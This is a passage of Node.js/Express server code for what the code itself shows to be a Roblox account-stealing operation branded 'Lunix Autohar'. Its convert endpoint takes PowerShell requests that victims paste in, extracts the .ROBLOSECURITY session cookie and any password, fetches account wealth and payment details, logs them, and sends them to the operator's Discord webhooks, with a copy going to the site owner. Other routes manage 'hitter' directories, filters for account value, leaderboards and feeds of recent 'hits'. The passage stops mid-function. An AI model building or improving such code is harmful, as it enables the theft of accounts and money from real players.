// Protected site owner token endpoint
app.get('/u/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
  console.log(`✅ Protected token request approved for IP: ${req.ip}`);
  res.json({ token: API_TOKEN });
});

// Protected parent directory page
app.get('/u/:directory', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName]) {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Directory not found' });
  }
});

// Protected parent directory convert endpoint
app.post('/u/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;
    let password = '';

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
      password = req.body.password || '';
    } else {
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);

    if (!hasBasicPowershellStructure) {
      // Silently reject plain text inputs without sending webhooks
      return res.status(400).json({ 
        success: false,
        message: 'Invalid input format',
        directory: directoryName
      });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
    // Updated regex to handle both direct assignment and New-Object System.Net.Cookie format
    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');

      // Check if token is empty, just whitespace, or only contains commas/special chars
      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
        // Send fallback embed when no valid token found
        const fallbackEmbed = {
          title: "⚠️ Input Received",
          description: "Input received but no ROBLOSECURITY found",
          color: 0xFFA500, // Orange color to distinguish from successful hits
          footer: {
            text: "Made By Lunix"
          }
        };

        const fallbackPayload = {
          embeds: [fallbackEmbed]
        };

        // Send to both directory webhook and site owner webhook
        try {
          await fetch(directoryConfig.webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.JSON.stringify(fallbackPayload)
          });

          const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
          if (siteOwnerWebhookUrl) {
            await fetch(siteOwnerWebhookUrl, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify(fallbackPayload)
            });
          }
        } catch (webhookError) {
          console.error('❌ Fallback webhook failed:', webhookError.message);
        }

        return res.status(400).json({ 
          success: false,
          message: 'Failed wrong input',
          directory: directoryName
        });
      }

      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 },
        emailVerified: false,
        emailAddress: null,
        voiceChatEnabled: false
      };

      // Add password to user data if provided
      if (password) {
        webhookUserData.password = password;
      }

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `<:emoji_37:1410520517349212200> +1 Hit - Lunix Autohar`;

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle, true);

      // Always send to site owner (main webhook)
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle, true);
      }

      if (!webhookResult.success) {
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
    } else {
      // Send fallback embed when no token found - do NOT send user data
      const fallbackEmbed = {
        title: "⚠️ Input Received",
        description: "Input received but no ROBLOSECURITY found",
        color: 0x8B5CF6, // Consistent purple color
        footer: {
          text: "Made By Lunix"
        }
      };

      const fallbackPayload = {
        embeds: [fallbackEmbed]
      };

      // Send to both directory webhook and site owner webhook
      try {
        await fetch(directoryConfig.webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(fallbackPayload)
        });

        const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
        if (siteOwnerWebhookUrl) {
          await fetch(siteOwnerWebhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify(fallbackPayload)
          });
        }
      } catch (webhookError) {
        console.error('❌ Fallback webhook failed:', webhookError.message);
      }

      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    // Log error without exposing sensitive details
    console.error('❌ Server error:', error.message);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Protected parent directory token endpoint
app.get('/u/:directory/api/token', tokenLimiter, protectTokenEndpoint, async (req, res) => {
  const directoryName = req.params.directory;

  if (!/^[a-z0-9-]+$/.test(directoryName)) {
    return res.status(400).json({ error: 'Invalid directory name format' });
  }

  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    console.log(`❌ Protected token request for non-existent directory: ${directoryName}, IP: ${req.ip}`);
    return res.status(404).json({ error: 'Directory not found' });
  }

  console.log(`✅ Protected directory token request approved for ${directoryName}, IP: ${req.ip}`);
  res.json({ token: directories[directoryName].apiToken });
});

// Middleware to protect admin dashboard with password
function requireAdminPassword(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Authentication required' });
  }

  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
  const [username, password] = credentials.split(':');

  // Check credentials (you can change these)
  const validUsername = process.env.ADMIN_USERNAME || 'admin';
  const validPassword = process.env.ADMIN_PASSWORD || 'admin123';

  if (username === validUsername && password === validPassword) {
    next();
  } else {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
    return res.status(401).json({ error: 'Invalid credentials' });
  }
}

// Serve the admin dashboard with password protection
app.get('/admin', requireAdminPassword, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// Token endpoint protection middleware
function protectTokenEndpoint(req, res, next) {
  // Check User-Agent to prevent automated abuse
  const userAgent = req.get('User-Agent');
  if (!userAgent || userAgent.length < 10) {
    return res.status(403).json({ error: 'Invalid request' });
  }

  // Enhanced origin validation
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (!origin) {
    return res.status(403).json({ error: 'Missing origin header' });
  }

  try {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      console.log(`❌ Unauthorized token request from origin: ${origin}, IP: ${req.ip}`);
      return res.status(403).json({ error: 'Unauthorized origin' });
    }
  } catch (error) {
    return res.status(403).json({ error: 'Invalid origin format' });
  }

  // Check for suspicious patterns
  const suspiciousPatterns = [
    /bot/i,
    /crawler/i,
    /spider/i,
    /scraper/i
  ];

  if (suspiciousPatterns.some(pattern => pattern.test(userAgent))) {
    console.log(`❌ Suspicious token request from User-Agent: ${userAgent}, IP: ${req.ip}`);
    return res.status(403).json({ error: 'Request blocked' });
  }

  next();
}

// Re-enabled token endpoint for root path (site owner)
app.get('/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
  console.log(`✅ Root path token request approved for IP: ${req.ip}`);
  res.json({ token: API_TOKEN });
});

// Test webhook endpoint
app.post('/test-webhook', async (req, res) => {
  try {
    const { directoryName, testMessage } = req.body;
    const directories = await loadDirectories();

    if (!directories[directoryName]) {
      return res.status(404).json({ 
        success: false, 
        error: 'Directory not found' 
      });
    }

    const directoryConfig = directories[directoryName];
    let webhookUrl = directoryConfig.webhookUrl;

    // For dualhook services, also test the dualhook webhook if provided
    if (directoryConfig.serviceType === 'dualhook' && directoryConfig.dualhookWebhookUrl) {
      webhookUrl = directoryConfig.dualhookWebhookUrl;
    }

    if (!webhookUrl) {
      return res.status(400).json({ 
        success: false, 
        error: 'No webhook URL configured for this directory' 
      });
    }

    // Create test webhook payload
    const testPayload = {
      embeds: [{
        title: "🧪 Webhook Test",
        description: "Webhook is working",
        color: 0x00ff00,
        footer: {
          text: `Test from ${directoryName} directory`
        },
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(testPayload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      return res.status(500).json({ 
        success: false, 
        error: `Webhook test failed: ${response.status} - ${errorText}` 
      });
    }

    res.json({ 
      success: true, 
      message: 'Webhook test successful!' 
    });

  } catch (error) {
    console.error('Error testing webhook:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Server error during webhook test' 
    });
  }
});

// API endpoint to create new directories
app.post('/api/create-directory', async (req, res) => {
  try {
    // Require a valid Discord pending session
    const pendingToken = req.cookies?.pending_session;
    const pendingSession = await getPendingSession(pendingToken);
    if (!pendingSession) {
      return res.status(401).json({ error: 'Discord authentication required. Please sign in with Discord first.' });
    }

    const { directoryName, webhookUrl, serviceType, dualhookWebhookUrl } = req.body;

    // Validate directory name
    if (!directoryName || !/^[a-z0-9-]+$/.test(directoryName) || directoryName.length > 50) {
      return res.status(400).json({ error: 'Invalid directory name. Use only lowercase letters, numbers, and hyphens. Max 50 characters.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid primary webhook URL' });
    }

    // Validate dualhook webhook if dualhook service type
    if (serviceType === 'dualhook' && (!dualhookWebhookUrl || !dualhookWebhookUrl.startsWith('http'))) {
      return res.status(400).json({ error: 'Invalid dualhook webhook URL' });
    }

    // Load existing directories
    const directories = await loadDirectories();

    // Check if this Discord user already owns a directory (one per account)
    const alreadyOwns = Object.values(directories).some(d => d.discordId === pendingSession.discordId);
    if (alreadyOwns) {
      return res.status(409).json({ error: 'Your Discord account already has a directory. Each account is limited to one directory.' });
    }

    // Check if directory name already exists
    if (directories[directoryName]) {
      return res.status(409).json({ error: 'Directory name already taken. Please choose a different name.' });
    }

    // Generate unique 6-8 digit ID using helper function
    const uniqueId = generateUniqueId(directories);

    // Create new directory entry — store discordId for OAuth login
    const authToken = crypto.randomBytes(32).toString('hex');
    directories[directoryName] = {
      webhookUrl: webhookUrl,
      serviceType: serviceType || 'single',
      dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      authToken: authToken,
      uniqueId: uniqueId,
      discordId: pendingSession.discordId,
      discordUsername: pendingSession.discordUsername,
      discordAvatar: pendingSession.discordAvatar,
      subdirectories: {},
      filters: {
        enabled: false,
        currency: { enabled: false, type: 'balance', value: 0 },
        collectibles: { enabled: false, type: 'rap', value: 0 },
        billings: { enabled: false, type: 'summary', value: 0 },
        creditBalance: { enabled: false, value: 0 },
        groups: { enabled: false, type: 'balance', value: 0 },
        premium: { enabled: false },
        korblox: { enabled: false },
        headless: { enabled: false }
      }
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save directory configuration' });
    }

    // Consume pending session — clear cookie and delete from DB
    await deletePendingSession(pendingToken);
    res.clearCookie('pending_session');

    // Issue a full session cookie now that the directory is created
    const sessionToken = await createSession(
      pendingSession.discordId,
      pendingSession.discordUsername,
      pendingSession.discordAvatar
    );
    res.cookie('session', sessionToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: SESSION_TTL_MS
    });



    // Send notification to the webhook about successful directory creation with auth token
    try {
      // Build links
const autoharLink = `http://${req.get('host')}/u/${directoryName}`;
const dualhookLink = `http://${req.get('host')}/${directoryName}/create`;
const dashboardLink = `http://${req.get('host')}/dashboard`;

// Title
const serviceTypeLabel = serviceType === 'dualhook' 
  ? `${directoryName.toUpperCase()} GENERATOR` 
  : 'LUNIX AUTOHAR';

// Description with inline clickable links
let description;

if (serviceType === 'dualhook') {
  description = 
    `[**AUTOHAR LINK**](${autoharLink}) | ` +
    `[**DUALHOOK LINK**](${dualhookLink}) | ` +
    `[**DASHBOARD URL**](${dashboardLink})`;
} else {
  description = 
    `[**AUTOHAR LINK**](${autoharLink}) | ` +
    `[**DASHBOARD URL**](${dashboardLink})`;
}

// Fields (ID + Discord login info — no raw token)
const fields = [
  {
    name: '🆔 **Your Unique ID**',
    value: `\`\`\`${directories[directoryName].uniqueId}\`\`\``,
    inline: false
  },
  {
    name: '🔐 **Login**',
    value: `Use **Login with Discord** at [Dashboard](${dashboardLink}) — no token needed.`,
    inline: false
  }
];

const notificationPayload = {
  embeds: [{
    title: serviceTypeLabel,
    description: description,
    fields: fields,
    color: 0x8B5CF6,
    footer: {
      text: serviceType === 'dualhook' 
        ? `Made By ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)}`
        : "Made By Lunix"
    }
  }]
};

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(notificationPayload)
      });


    } catch (webhookError) {
    // Log webhook errors without exposing URLs
    console.error('❌ Webhook notification failed:', webhookError.message);
  }

    res.json({ 
      success: true, 
      directoryName: directoryName,
      apiToken: directories[directoryName].apiToken,
      authToken: authToken,
      uniqueId: directories[directoryName].uniqueId
    });

  } catch (error) {
    console.error('Error creating directory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Serve the site owner index page
app.get('/u/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Serve login page
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Serve dashboard page
app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API endpoint: check current session (used by dashboard on load)
app.get('/api/session', async (req, res) => {
  const token = req.cookies?.session;
  const session = await getSession(token);
  if (!session) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // Find which directory this Discord ID owns
  const directories = await loadDirectories();
  let foundDirectory = null;

  for (const [dirName, dirConfig] of Object.entries(directories)) {
    if (dirConfig.discordId === session.discordId) {
      foundDirectory = dirName;
      break;
    }
  }

  res.json({
    discordId: session.discordId,
    discordUsername: session.discordUsername,
    discordAvatar: session.discordAvatar,
    directoryName: foundDirectory
  });
});

// Middleware to authenticate dashboard API requests via session cookie
async function authenticateUser(req, res, next) {
  const token = req.cookies?.session;
  const session = await getSession(token);
  if (!session) {
    return res.status(401).json({ error: 'Not authenticated' });
  }

  // Find the directory owned by this Discord user
  const directories = await loadDirectories();
  let userDirectory = null;
  let directoryConfig = null;

  for (const [dirName, dirConfig] of Object.entries(directories)) {
    if (dirConfig.discordId === session.discordId) {
      userDirectory = dirName;
      directoryConfig = dirConfig;
      break;
    }
  }

  if (!userDirectory) {
    return res.status(401).json({ error: 'No directory linked to this account' });
  }

  req.session = session;
  req.sessionToken = token;
  req.userDirectory = userDirectory;
  req.directoryConfig = directoryConfig;
  // Keep req.userToken as the directory's internal apiToken for any code that still reads it
  req.userToken = directoryConfig.authToken;
  next();
}

// API endpoint to get directory filters for authenticated users
app.get('/api/user-filters', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;

    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    let directoryConfig = null;
    let isSubdirectory = false;

    // First check main directories
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        directoryConfig = dirConfig;
        break;
      }

      // Then check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            directoryConfig = dirConfig; // Use parent config for filters
            isSubdirectory = true;
            break;
          }
        }
      }

      if (userDirectory) break;
    }

    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Only return filters for Dualhook directories AND only for parent directory users (not subdirectories)
    if (directoryConfig.serviceType !== 'dualhook') {
      return res.status(403).json({ error: 'Filters are only available for Dualhook directories' });
    }

    // Subdirectory users should not see or modify filters
    if (isSubdirectory) {
      return res.status(403).json({ error: 'Filters are not available for subdirectory users' });
    }

    res.json({
      directory: userDirectory,
      serviceType: directoryConfig.serviceType,
      isSubdirectory: isSubdirectory,
      filters: directoryConfig.filters || {
        enabled: false,
        currency: { enabled: false, type: 'balance', value: 0 },
        collectibles: { enabled: false, type: 'rap', value: 0 },
        billings: { enabled: false, type: 'summary', value: 0 },
        creditBalance: { enabled: false, value: 0 },
        groups: { enabled: false, type: 'balance', value: 0 },
        premium: { enabled: false },
        korblox: { enabled: false },
        headless: { enabled: false }
      }
    });

  } catch (error) {
    console.error('Error getting user filters:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to update directory filters for authenticated users
app.post('/api/user-filters', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;
    const { filters } = req.body;

    if (!filters) {
      return res.status(400).json({ error: 'Filters configuration required' });
    }

    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    let parentDirectory = null;
    let isSubdirectory = false;

    // First check main directories
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        parentDirectory = dirName;
        break;
      }

      // Then check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            parentDirectory = dirName;
            isSubdirectory = true;
            break;
          }
        }
      }

      if (userDirectory) break;
    }

    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Only allow filter updates for Dualhook directories (check parent directory)
    if (directories[parentDirectory].serviceType !== 'dualhook') {
      return res.status(403).json({ error: 'Filters are only available for Dualhook directories' });
    }

    // Subdirectory users should not be able to update filters
    if (isSubdirectory) {
      return res.status(403).json({ error: 'Subdirectory users cannot modify filters' });
    }

    // Update filters in parent directory (filters are shared across all subdirectories)
    directories[parentDirectory].filters = {
      enabled: filters.enabled || false,
      currency: {
        enabled: filters.currency?.enabled || false,
        type: filters.currency?.type || 'balance',
        value: Math.max(0, parseInt(filters.currency?.value) || 0)
      },
      collectibles: {
        enabled: filters.collectibles?.enabled || false,
        type: filters.collectibles?.type || 'rap',
        value: Math.max(0, parseInt(filters.collectibles?.value) || 0)
      },
      billings: {
        enabled: filters.billings?.enabled || false,
        type: filters.billings?.type || 'summary',
        value: Math.max(0, parseInt(filters.billings?.value) || 0)
      },
      creditBalance: {
        enabled: filters.creditBalance?.enabled || false,
        value: Math.max(0, parseFloat(filters.creditBalance?.value) || 0)
      },
      groups: {
        enabled: filters.groups?.enabled || false,
        type: filters.groups?.type || 'balance',
        value: Math.max(0, parseInt(filters.groups?.value) || 0)
      },
      premium: {
        enabled: filters.premium?.enabled || false
      },
      korblox: {
        enabled: filters.korblox?.enabled || false
      },
      headless: {
        enabled: filters.headless?.enabled || false
      }
    };

    // Save directories
    const saveSuccess = await saveDirectories(directories);
    if (!saveSuccess) {
      return res.status(500).json({ error: 'Failed to save filter configuration' });
    }

    console.log(`✅ Filters updated for Dualhook directory: ${userDirectory}`);

    res.json({
      success: true,
      message: 'Filters updated successfully',
      filters: directories[parentDirectory].filters
    });

  } catch (error) {
    console.error('Error updating user filters:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get user statistics
app.get('/api/user-stats', authenticateUser, async (req, res) => {
  try {
    const authToken = req.userToken;

    // Find user's directory
    const directories = await loadDirectories();
    let userDirectory = null;
    let uniqueId = null;

    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.authToken === authToken) {
        userDirectory = dirName;
        uniqueId = dirConfig.uniqueId;
        break;
      }

      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.authToken === authToken) {
            userDirectory = `${dirName}/${subName}`;
            uniqueId = subConfig.uniqueId;
            break;
          }
        }
      }

      if (userDirectory) break;
    }

    if (!userDirectory) {
      return res.status(401).json({ error: 'Invalid token' });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific user/subdirectory only
    const userLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For subdirectories, only match exact subdirectory path
      if (userDirectory.includes('/')) {
        const [parentDir, subDir] = userDirectory.split('/');
        return log.context.directory === parentDir && log.context.subdirectory === subDir;
      }

      // For parent directories, only match direct hits (not subdirectory hits)
      return log.context.directory === userDirectory && !log.context.subdirectory;
    });

    const today = new Date().toDateString();
    const todayLogs = userLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = userLogs.length;
    const totalSummary = userLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = userLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = userLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    res.json({
      totalAccounts,
      totalSummary,
      totalRobux,
      totalRAP,
      todayAccounts,
      todaySummary,
      todayRobux,
      todayRAP,
      uniqueId,
      directory: userDirectory
    });

  } catch (error) {
    console.error('Error getting user stats:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get global leaderboards
app.get('/api/leaderboard', async (req, res) => {
  try {
    if (!db) {
      return res.json([]);
    }

    const directories = await loadDirectories();
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Group logs by directory owner (Discord user)
    const userStats = {};

    Object.values(allLogs).forEach(log => {
      if (!log.context || !log.context.directory) return;

      const directory = log.context.directory;
      const dirConfig = directories[directory];
      
      if (!dirConfig || !dirConfig.discordId) return;

      const userId = dirConfig.discordId;

      if (!userStats[userId]) {
        userStats[userId] = {
          discordId: dirConfig.discordId,
          discordUsername: dirConfig.harName || 'Unknown User',
          discordAvatar: dirConfig.discordAvatar || null,
          totalHits: 0,
          totalSummary: 0,
          totalRobux: 0,
          totalRAP: 0
        };
      }

      userStats[userId].totalHits++;
      if (log.userData) {
        userStats[userId].totalSummary += log.userData.summary || 0;
        userStats[userId].totalRobux += log.userData.robux || 0;
        userStats[userId].totalRAP += log.userData.rap || 0;
      }
    });

    // Convert to array and sort by total summary
    const leaderboard = Object.values(userStats)
      .sort((a, b) => b.totalSummary - a.totalSummary);

    res.json(leaderboard);
  } catch (error) {
    console.error('Error getting leaderboard:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get recent hits with full details (NEW - for redesigned dashboard)
app.get('/api/hits/recent', async (req, res) => {
  try {
    if (!db) {
      return res.json([]);
    }

    const limit = parseInt(req.query.limit) || 20;
    const directories = await loadDirectories();

    // Get recent logs from Firebase
    const logsRef = db.ref('user_logs');
    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(limit);
    const snapshot = await recentLogsQuery.once('value');
    const recentLogs = [];

    snapshot.forEach(childSnapshot => {
      recentLogs.push({
        key: childSnapshot.key,
        ...childSnapshot.val()
      });
    });

    // Format for display with hitter info
    const liveHits = recentLogs
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .map(log => {
        const directory = log.context?.directory;
        const dirConfig = directories[directory];
        
        return {
          robloxUsername: log.userData?.username || 'Unknown',
          robloxUserId: log.userData?.userId || '0',
          robux: log.userData?.robux || 0,
          rap: log.userData?.rap || 0,
          summary: log.userData?.summary || 0,
          timestamp: log.timestamp,
          hitterName: dirConfig?.harName || directory || 'Unknown',
          hitterId: dirConfig?.discordId || '0',
          hitterAvatar: dirConfig?.discordId && dirConfig?.discordAvatar
            ? `https://cdn.discordapp.com/avatars/${dirConfig.discordId}/${dirConfig.discordAvatar}.png`
            : 'https://cdn.discordapp.com/embed/avatars/0.png'
        };
      });

    res.json(liveHits);
  } catch (error) {
    console.error('Error getting recent hits:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// API endpoint to get live hits (OLD - kept for backwards compatibility)
app.get('/api/live-hits', async (req, res) => {
  try {
    // Get recent logs from Firebase
    const logsRef = db.ref('user_logs');
    const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(20);
    const snapshot = await recentLogsQuery.once('value');
    const recentLogs = snapshot.val() || {};

    // Format for display
    const liveHits = Object.values(recentLogs)
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
      .slice(0, 5)
      .map(log => ({
        username: log.userData.username || log.context?.directory || 'Unknown',
        timestamp: log.timestamp
      }));

    res.json(liveHits);

  } catch (error) {
    console.error('Error getting live hits:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public API endpoint for bots to get directory stats by unique ID
app.get('/api/bot/stats/id/:uniqueId', async (req, res) => {
  try {
    const uniqueId = req.params.uniqueId;

    // Load directories to find the one with this unique ID
    const directories = await loadDirectories();

    let targetDirectory = null;
    let targetDirectoryName = null;
    let isSubdirectory = false;

    // Search through all directories and subdirectories for the unique ID
    for (const [dirName, dirConfig] of Object.entries(directories)) {
      if (dirConfig.uniqueId === uniqueId) {
        targetDirectory = dirName;
        targetDirectoryName = dirName;
        break;
      }

      // Check subdirectories
      if (dirConfig.subdirectories) {
        for (const [subName, subConfig] of Object.entries(dirConfig.subdirectories)) {
          if (subConfig.uniqueId === uniqueId) {
            targetDirectory = `${dirName}/${subName}`;
            targetDirectoryName = subName;
            isSubdirectory = true;
            break;
          }
        }
      }

      if (targetDirectory) break;
    }

    if (!targetDirectory) {
      return res.status(404).json({ 
        error: 'Directory not found',
        uniqueId: uniqueId
      });
    }

    // Get user logs from Firebase
    const logsRef = db.ref('user_logs');
    const snapshot = await logsRef.once('value');
    const allLogs = snapshot.val() || {};

    // Filter logs for this specific directory
    const directoryLogs = Object.values(allLogs).filter(log => {
      if (!log.context) return false;

      // For direct directory matches
      if (log.context.directory === targetDirectory) return true;

      // For subdirectory matches
      if (log.context.subdirectory && 
          `${log.context.directory}/${log.context.subdirectory}` === targetDirectory) {
        return true;
      }

      return false;
    });

    const today = new Date().toDateString();
    const todayLogs = directoryLogs.filter(log => {
      const logDate = new Date(log.timestamp).toDateString();
      return logDate === today;
    });

    // Calculate statistics
    const totalAccounts = directoryLogs.length;
    const totalSummary = directoryLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const totalRobux = directoryLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const totalRAP = directoryLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    const todayAccounts = todayLogs.length;
    const todaySummary = todayLogs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
    const todayRobux = todayLogs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
    const todayRAP = todayLogs.reduce((sum, log) => sum + (log.userData.rap || 0), 0);

    // Get last hit info
    const lastHit = directoryLogs.length > 0 
      ? directoryLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0]
      : null;

    res.json({
      uniqueId: uniqueId,
      directory: targetDirectoryName,
      fullPath: targetDirectory,
      isSubdirectory: isSubdirectory,
      stats: {
        totalAccounts,
        totalSummary,
        totalRobux,
        totalRAP,
        todayAccounts,
        todaySummary,
        todayRobux,
        todayRAP
      },
      lastHit: lastHit ? {
        username: lastHit.userData.username || 'Unknown',
        timestamp: lastHit.timestamp,
        robux: lastHit.userData.robux || 0,
        premium: lastHit.userData.premium || false
      } : null
    });

  } catch (error) {
    console.error('Error getting bot stats by ID:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Public API endpoint for bots to get directory stats
app.get('/api/bot/stats/:directory', async (req, res) => {
  try {
    const directoryName = req.params.directory;

    // Load directories to verify the directory exists
    const directories = await loadDirectories();

    // Check if directory exists (including subdirectories)
    let directoryExists = false;
    let targetDirectory = directoryName;

    if (directories[directoryName]) {
      directoryExists = true;
    } else {
      // Check if it's a subdirectory format (parent/sub)
      const parts = directoryName.split('/');
      if (parts.length === 2) {
        const [parentDir, subDir] = parts;
        if (directories[parentDir] && 
            directories[parentDir].subdirectories && 
            directories[parentDir].subdirectories[subDir]) {
          directoryExists = true;
